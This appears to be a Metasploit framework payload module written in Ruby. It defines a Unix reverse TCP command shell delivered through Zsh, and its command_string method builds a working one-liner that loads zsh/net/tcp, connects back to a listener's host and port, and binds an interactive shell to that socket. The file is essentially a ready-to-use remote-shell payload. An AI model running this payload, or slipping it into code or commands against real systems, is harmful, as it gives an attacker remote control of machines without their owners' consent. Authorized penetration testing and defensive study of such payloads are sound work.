##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 110

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
      'Description' => %q{
        Connect back and create a command shell via Zsh by direction operations.  Note: Although Zsh is often
        available, please be aware it isn't usually installed by default.
      },
      'Author'      => 'Wang Yihang <wangyihanger[at]gmail.com>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'zsh',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return super + command_string
  end

  def command_string
    # zmodload zsh/net/tcp && ztcp -d 9 127.0.0.1 8080 && zsh 1>&9 2>&9 0>&9
    cmd = "zmodload zsh/net/tcp && ztcp -d 9 #{datastore['LHOST']} #{datastore['LPORT']} && zsh 1>&9 2>&9 0>&9"
  end
end
